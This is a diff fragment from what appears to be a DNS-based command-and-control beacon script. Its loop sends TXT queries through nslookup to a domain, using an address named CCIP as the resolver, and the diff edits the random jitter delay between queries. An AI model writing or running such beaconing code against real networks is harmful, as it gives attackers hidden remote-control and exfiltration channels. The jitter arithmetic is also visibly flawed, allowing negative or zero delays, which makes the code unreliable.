@@ -102,7 +102,7 @@ if __name__ == "__main__":
         try:
             print('[+] Sending DNS query: ' + DOMAIN_NAME)
             os.system('nslookup -q=txt ' + DOMAIN_NAME + ' ' + CCIP + ' > /dev/null')
-            time.sleep(random.uniform(-0.25, 0.25) * QUERY_DELAY)
+            time.sleep(int(random.uniform(-0.25, 0.25) * QUERY_DELAY))
         except KeyboardInterrupt:
             break
     
